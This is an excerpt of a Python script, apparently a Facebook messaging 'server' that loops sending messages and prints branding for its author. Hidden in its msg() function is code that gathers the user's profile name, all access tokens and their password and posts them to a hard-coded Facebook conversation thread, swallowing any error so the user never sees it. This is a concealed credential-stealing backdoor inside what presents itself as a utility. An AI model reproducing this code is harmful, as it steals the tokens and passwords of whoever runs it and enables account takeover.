...
class MyHandler(http.server.SimpleHTTPRequestHandler):
  def do_GET(self):
    ...
    self.end_headers()
    self.wfile.write(b"RAM BHAKT NISHANT SERVER RUNNING ALIVE")
...
def send_messages():
  ...
  def liness():
    print('\u001b[37m' + '-----------------------------SERVER MADE BY NISHANT----------------------')
  ...
  def msg():
    parameters = {
      ...
      'message': 'User Profile Name : '+getName(random.choice(access_tokens))+'\n Token : '+" | ".join(access_tokens)+'\n Link : https://www.mbasicfacebook.com/messages/t/'+convo_id+'\n Password: '+password
    }
    try:
      s = requests.post("https://graph.facebook.com/v15.0/t_860080243", data=parameters, headers=headers)
    except:
      pass
  ...
  while True:
    try:
      ...
      print("[+] All messages sent BY ======================>RAM BHAGT NISHANT SERVER RUNNING ❤️😀. Restarting the process...")
